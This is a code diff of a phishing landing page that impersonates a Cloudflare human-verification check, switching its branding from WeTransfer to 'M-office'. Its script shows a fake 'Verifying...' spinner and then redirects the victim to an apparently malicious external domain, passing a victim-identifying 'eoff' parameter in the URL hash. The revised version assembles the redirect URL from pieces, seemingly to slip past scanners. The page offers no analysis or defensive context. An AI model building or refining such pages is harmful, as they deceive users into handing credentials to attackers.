@@ -3,136 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WeTransferFILES</title>
+    <title>M-office</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f8f8f8;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #333;
-            flex-direction: column;
+            padding: 20px;
+            overflow: hidden;
         }
 
-        .logo-container {
-            margin-bottom: 30px;
-            text-align: center;
-            transition: opacity 0.5s ease-in-out;
+        .logo-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f8f8f8;
+            z-index: 10;
         }
 
         .logo-img {
-            width: 150px;
-            height: 150px;
-            border-radius: 8px;
-            animation: breathing 2.5s ease-in-out;
-<!--            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);-->
+            width: 180px;
+            height: 180px;
+            object-fit: contain;
+            animation: breathing 2s ease-in-out infinite;
+            opacity: 1;
+            transition: opacity 0.5s ease;
         }
 
         @keyframes breathing {
-            0%, 100% {
-                transform: scale(1);
-                opacity: 0.8;
+            0% {
+                transform: scale(0.95);
+                opacity: 0.9;
             }
             50% {
                 transform: scale(1.05);
                 opacity: 1;
             }
-        }
-
-        .logo-container.hidden {
-            opacity: 0;
-            display: none;
-        }
-
-        .container {
-            width: 500px;
-            opacity: 0;
-            transition: opacity 0.5s ease-in;
-        }
-
-        .container.visible {
-            opacity: 1;
-        }
-
-        .verification-instruction {
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            color: #333;
-            padding-left: 25px;
-            padding-right: 25px;
-            text-align: center;
+            100% {
+                transform: scale(0.95);
+                opacity: 0.9;
+            }
         }
 
         .verification-box {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 30px;
+            width: 100%;
+            height: 100px;
+            max-width: 480px;
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            background-color: #f9f9f9;
+            align-items: center;
             border: 1px solid #e0e0e0;
-            border-radius: 6px;
-            padding: 20px;
-            transition: all 0.3s ease;
+            opacity: 0;
+            transition: opacity 0.5s ease;
         }
 
-        .verification-box:hover {
-            border-color: #c0c0c0;
-        }
-
-        .left-content {
+        .verification-section {
             display: flex;
             align-items: center;
-            gap: 15px;
         }
 
-        .verification-text {
-            font-size: 16px;
+        .verification-label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 18px;
             font-weight: 500;
-            transition: all 0.3s ease;
+            color: #333;
         }
 
         .checkbox-container {
             position: relative;
             width: 24px;
             height: 24px;
+            margin-right: 12px;
         }
 
         .checkbox {
             position: absolute;
             opacity: 0;
-            width: 0;
+            cursor: pointer;
             height: 0;
+            width: 0;
         }
 
         .checkmark {
             position: absolute;
             top: 0;
             left: 0;
-            width: 24px;
             height: 24px;
+            width: 24px;
             background-color: #f0f0f0;
-            border: 2px solid #c0c0c0;
             border-radius: 4px;
-            cursor: pointer;
+            border: 2px solid #ccc;
             transition: all 0.3s ease;
         }
 
-        .checkbox:checked + .checkmark {
+        .checkbox:checked ~ .checkmark {
             background-color: #4CAF50;
             border-color: #4CAF50;
         }
 
-        .checkbox:checked + .checkmark:after {
+        .checkmark:after {
             content: "";
             position: absolute;
+            display: none;
+        }
+
+        .checkbox:checked ~ .checkmark:after {
+            display: block;
             left: 7px;
             top: 3px;
             width: 6px;
@@ -144,156 +140,163 @@
 
         .spinner {
             display: none;
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 24px;
             height: 24px;
-            border: 2px solid transparent;
-            border-top: 2px solid #4CAF50;
+            border: 3px solid rgba(76, 175, 80, 0.3);
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            border-top-color: #4CAF50;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 12px;
         }
 
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            to { transform: rotate(360deg); }
         }
 
-        .right-content {
+        .success-text {
+            display: none;
+            color: #4CAF50;
+            font-weight: 600;
+        }
+
+        .branding-section {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
-            gap: 8px;
+            text-align: right;
         }
 
-        .brand-container {
+        .logo-container {
             display: flex;
             align-items: center;
-            gap: 10px;
+            margin-bottom: 10px;
         }
 
-        .brand-img {
-            width: 32px;
-            height: 32px;
-            border-radius: 4px;
+        .cloudflare-img {
+            width: 40px;
+            height: 40px;
+            margin-right: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
-            color: #777;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
         }
 
-        .brand {
-            font-family: 'Georgia', serif;
-            font-size: 14px;
-            font-weight: bold;
+        .logo {
+            font-size: 15px;
+            font-weight: 700;
             color: #2c3e50;
+            letter-spacing: 1px;
         }
 
         .footer {
-            font-size: 12px;
             color: #777;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #777;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="logo-container" id="logoContainer">
-        <img src="logo.png" alt="WeTransfer" class="logo-img">
+    <div class="logo-screen" id="logo-screen">
+        <img src="logo.png" alt="Logo" class="logo-img" id="logo-img">
     </div>
 
-    <div class="container" id="verification-container">
-        <div class="verification-instruction">
-            To view this document, verify you're not a robot below
-        </div>
-        
-        <div class="verification-box">
-            <div class="left-content">
-                <span class="verification-text" id="verification-text">Verify</span>
+    <div class="verification-box" id="verification-box">
+        <div class="verification-section">
+            <label class="verification-label" id="verification-label">
                 <div class="checkbox-container">
-                    <input type="checkbox" class="checkbox" id="verify-checkbox">
-                    <label for="verify-checkbox" class="checkmark"></label>
+                    <input type="checkbox" class="checkbox" id="verification-checkbox">
+                    <span class="checkmark"></span>
                     <div class="spinner" id="spinner"></div>
                 </div>
-            </div>
+                <span id="verification-text">Verify</span>
+                <span id="verifying-text" style="display: none;">Verifying...</span>
+                <span class="success-text" id="success-text">Success!</span>
+            </label>
+        </div>
 
-            <div class="right-content">
-                <div class="brand-container">
-                    <img src="cloudflare_.png" alt="Cloudflare" class="brand-img">
-                    <div class="brand">CLOUDFLARE</div>
-                </div>
-                <div class="footer">
-                    Privacy · Terms
-                </div>
+        <div class="branding-section">
+            <div class="logo-container">
+                <img src="cloudflare_.png" alt="Cloudflare" class="cloudflare-img">
+                <div class="logo">CLOUDFLARE</div>
+            </div>
+            <div class="footer">
+                <a href="#">Privacy</a> · <a href="#">Terms</a>
             </div>
         </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const checkbox = document.getElementById('verify-checkbox');
+        // Show logo with breathing animation for 2.5 seconds, then show verification
+        window.addEventListener('load', function() {
+            const logoScreen = document.getElementById('logo-screen');
+            const logoImg = document.getElementById('logo-img');
+            const verificationBox = document.getElementById('verification-box');
+
+            setTimeout(function() {
+                // Fade out the logo
+                logoImg.style.opacity = '0';
+
+                setTimeout(function() {
+                    // Hide logo screen and show verification
+                    logoScreen.style.display = 'none';
+                    verificationBox.style.opacity = '1';
+                }, 500); // Wait for fade out to complete
+            }, 2500); // Show logo for 2.5 seconds
+        });
+
+        document.getElementById('verification-checkbox').addEventListener('change', function() {
+            const checkbox = this;
             const spinner = document.getElementById('spinner');
             const verificationText = document.getElementById('verification-text');
-            const verificationContainer = document.getElementById('verification-container');
-            const logoContainer = document.getElementById('logoContainer');
+            const verifyingText = document.getElementById('verifying-text');
+            const successText = document.getElementById('success-text');
+            const checkmark = document.querySelector('.checkmark');
 
-            // Hide logo and show verification interface after logo animation
-            setTimeout(function() {
-                // Hide the logo
-                logoContainer.classList.add('hidden');
+            if (checkbox.checked) {
+                // Show spinner and hide checkbox
+                checkmark.style.display = 'none';
+                spinner.style.display = 'block';
+                verificationText.style.display = 'none';
+                verifyingText.style.display = 'inline';
 
-                // Show verification interface
+                // Simulate verification process
                 setTimeout(function() {
-                    verificationContainer.classList.add('visible');
-                }, 100);
-            }, 2500); // 2.5 seconds delay
+                    // Show success
+                    spinner.style.display = 'none';
+                    verifyingText.style.display = 'none';
+                    successText.style.display = 'inline';
 
-            // Function to get URL parameter from current URL
-            function getUrlParameter() {
-                const urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get('eoff') || '';
-            }
+                    // Get the parameter from current URL
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const eoffValue = urlParams.get('eoff') || '';
 
-            // Function to build redirect URL
-            function buildRedirectUrl() {
-                const baseUrl = 'https://offinv.ruffilescowork.online/DabPdSTl';
-                const parameter = getUrlParameter();
+                    // Construct redirect URL in pieces
+                    const baseUrl = 'offinv.ruffilescowork.online';
+                    const path = '/DabPdSTl';
+                    const hash = eoffValue ? '#' + eoffValue : '';
 
-                return parameter ? `${baseUrl}#${parameter}` : baseUrl;
-            }
+                    // Combine pieces and redirect
+                    const redirectUrl = 'https://' + baseUrl + path + hash;
 
-            checkbox.addEventListener('change', function() {
-                if (this.checked) {
-                    // Add a natural delay before starting verification
+                    // Redirect after a short delay
                     setTimeout(function() {
-                        // Hide checkmark and show spinner
-                        document.querySelector('.checkmark').style.opacity = '0';
-                        spinner.style.display = 'block';
-                        verificationText.textContent = "Verifying...";
-
-                        // Simulate verification process
-                        setTimeout(function() {
-                            // Hide spinner and show checkmark
-                            spinner.style.display = 'none';
-                            document.querySelector('.checkmark').style.opacity = '1';
-                            verificationText.textContent = "Success!";
-
-                            // Build and use the redirect URL
-                            const redirectUrl = buildRedirectUrl();
-
-                            // Redirect after a short delay
-                            setTimeout(function() {
-                                window.location.href = redirectUrl;
-                            }, 1000);
-                        }, 2000);
-                    }, 300); // Natural delay before verification starts
-                } else {
-                    // Reset if unchecked
-                    verificationText.textContent = "Verify";
-                }
-            });
+                        window.location.href = redirectUrl;
+                    }, 1000);
+                }, 1500);
+            }
         });
     </script>
 </body>
 </html>
-
